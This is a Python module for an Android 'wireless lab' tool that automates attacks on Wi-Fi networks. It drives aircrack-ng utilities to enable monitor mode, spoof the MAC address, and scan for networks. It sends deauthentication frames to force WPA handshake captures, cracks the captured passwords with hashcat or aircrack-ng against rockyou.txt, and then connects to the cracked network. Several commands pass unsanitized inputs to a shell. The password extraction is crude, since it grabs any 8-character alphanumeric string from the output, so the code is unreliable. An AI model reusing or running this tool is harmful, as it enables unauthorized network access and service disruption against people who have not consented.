"""
CyberLab Pro v3.0 — Wireless Lab (Android/Chaquopy)
Ported from Flask/Termux version.
"""
import os
import re
import time
import signal
import subprocess
import threading
from pathlib import Path
from queue import Queue, Empty
from datetime import datetime

from core.utils import (
    run_command, get_tool_path, check_tool, detect_interfaces,
    DATA_DIR, CAPTURE_DIR, WORDLIST_DIR, BINARIES_DIR, LOG_DIR,
    CommandRunner, log_activity,
)


class WirelessLab:
    def __init__(self):
        self.interfaces = {}
        self.monitor_iface = None
        self.monitor_active = False
        self.target_network = None
        self.handshake_file = None
        self.cracked_password = None
        self.scan_results = []
        self._runner = CommandRunner()
        Path(CAPTURE_DIR).mkdir(parents=True, exist_ok=True)

    def get_interfaces(self) -> list:
        return detect_interfaces()

    def start_monitor_mode(self, interface: str, channel: int = None,
                           kill_processes: bool = True, random_mac: bool = False) -> dict:
        if not check_tool("airmon-ng"):
            return {"success": False, "error": "airmon-ng not found"}
        if kill_processes:
            run_command(f"{get_tool_path('airmon-ng')} check kill")
        if random_mac:
            run_command(f"ip link set {interface} down")
            run_command(f"{get_tool_path('macchanger')} -r {interface}")
            run_command(f"ip link set {interface} up")
        methods = [
            f"{get_tool_path('airmon-ng')} start {interface}" + (f" {channel}" if channel else ""),
            f"ip link set {interface} down && {get_tool_path('iw')} dev {interface} set type monitor && ip link set {interface} up",
            f"ifconfig {interface} down && {get_tool_path('iwconfig')} {interface} mode monitor && ifconfig {interface} up",
        ]
        for method in methods:
            try:
                res = subprocess.run(method, shell=True, capture_output=True, text=True, timeout=10)
                if res.returncode == 0:
                    self.monitor_active = True
                    self.monitor_iface = f"{interface}mon" if not interface.endswith("mon") else interface
                    return {"success": True, "interface": self.monitor_iface}
            except Exception:
                continue
        return {"success": False, "error": "Failed to start monitor mode"}

    def stop_monitor_mode(self) -> dict:
        if self.monitor_iface:
            run_command(f"{get_tool_path('airmon-ng')} stop {self.monitor_iface}")
            self.monitor_active = False
            self.monitor_iface = None
        return {"success": True}

    def scan_networks(self, interface: str = None, band: str = "bg",
                      encrypt_filter: str = None, duration: int = 8) -> list:
        iface = interface or self.monitor_iface or "wlan1"
        csv_file = f"{CAPTURE_DIR}/scan_{int(time.time())}"
        cmd = f"{get_tool_path('airodump-ng')} {iface} --band {band} --write {csv_file} --output-format csv --write-interval 1"
        try:
            proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(duration)
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            pass
        networks = []
        csv_path = f"{csv_file}-01.csv"
        if os.path.exists(csv_path):
            try:
                with open(csv_path) as f:
                    content = f.read()
                sections = content.split("\n\n")
                if len(sections) > 1:
                    for line in sections[1].splitlines()[1:]:
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) >= 14:
                            bssid = parts[0]
                            ch = parts[3]
                            enc = parts[5]
                            ssid = parts[13]
                            power = parts[8]
                            if bssid and ":" in bssid:
                                net = {
                                    "bssid": bssid, "channel": ch.strip(),
                                    "encryption": enc.strip(), "ssid": ssid.strip(),
                                    "signal": power.strip(),
                                }
                                if encrypt_filter and encrypt_filter.lower() not in enc.lower():
                                    continue
                                networks.append(net)
            except Exception:
                pass
        self.scan_results = networks
        return networks

    def capture_handshake(self, bssid: str, channel: int, interface: str = None,
                          output_file: str = "capture", method: str = "standard",
                          duration: int = 30, auto_deauth: bool = True) -> dict:
        iface = interface or self.monitor_iface or "wlan1"
        output_path = f"{CAPTURE_DIR}/{output_file}"
        cmd = f"{get_tool_path('airodump-ng')} -c {channel} --bssid {bssid} -w {output_path} {iface}"
        try:
            proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if auto_deauth:
                threading.Thread(
                    target=lambda: run_command(
                        f"{get_tool_path('aireplay-ng')} -0 5 -a {bssid} {iface}", timeout=10
                    ), daemon=True
                ).start()
            time.sleep(duration)
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            pass
        cap_file = f"{output_path}-01.cap"
        if os.path.exists(cap_file):
            self.handshake_file = cap_file
            return {"success": True, "file": cap_file}
        return {"success": False, "error": "Handshake not captured"}

    def crack_password(self, capture_file: str = None, wordlist: str = None,
                       hash_mode: str = "22000", tool: str = "hashcat",
                       use_rules: bool = False) -> dict:
        cap = capture_file or self.handshake_file
        if not cap or not os.path.exists(cap):
            return {"success": False, "error": "No capture file"}
        wl = wordlist or f"{WORDLIST_DIR}/rockyou.txt"
        if not os.path.isabs(wl):
            wl = f"{WORDLIST_DIR}/{wl}"
        if tool == "hashcat" and check_tool("hashcat"):
            cmd = f"{get_tool_path('hashcat')} -m {hash_mode} -a 0 {cap} {wl} --force -O --status"
            if use_rules:
                cmd += f" -r {WORDLIST_DIR}/best64.rule"
        elif tool == "aircrack" and check_tool("aircrack-ng"):
            cmd = f"{get_tool_path('aircrack-ng')} -w {wl} {cap}"
        else:
            return {"success": False, "error": f"Tool {tool} not available"}
        res = run_command(cmd, timeout=600)
        if res["success"]:
            m = re.search(r"[A-Za-z0-9]{8,}", res["stdout"])
            if m:
                self.cracked_password = m.group(0)
                return {"success": True, "password": m.group(0)}
        return {"success": False, "error": "Password not found", "output": res["stdout"][:500]}

    def deauth_clients(self, bssid: str, count: int = 10, client: str = None, interface: str = None) -> dict:
        iface = interface or self.monitor_iface or "wlan1"
        target = f"-c {client}" if client else ""
        cmd = f"{get_tool_path('aireplay-ng')} -0 {count} -a {bssid} {target} {iface}"
        res = run_command(cmd, timeout=30)
        return {"success": res["success"], "count": count}

    def connect_to_network(self, ssid: str = None, password: str = None, method: str = "wpa_supplicant") -> dict:
        if method == "wpa_supplicant" and check_tool("wpa_supplicant"):
            conf = f"/data/local/tmp/wpa.conf"
            with open(conf, "w") as f:
                f.write(f'network={{\n  ssid="{ssid}"\n  psk="{password}"\n}}\n')
            run_command(f"{get_tool_path('wpa_supplicant')} -B -i wlan0 -c {conf}")
            res = run_command(f"{get_tool_path('dhclient')} wlan0", timeout=15)
            return {"success": res["success"]}
        return {"success": False, "error": "Connection method not available"}

    def get_status(self) -> dict:
        return {
            "monitor_active": self.monitor_active,
            "monitor_iface": self.monitor_iface,
            "target": self.target_network,
            "handshake_captured": self.handshake_file is not None,
            "cracked": self.cracked_password is not None,
        }
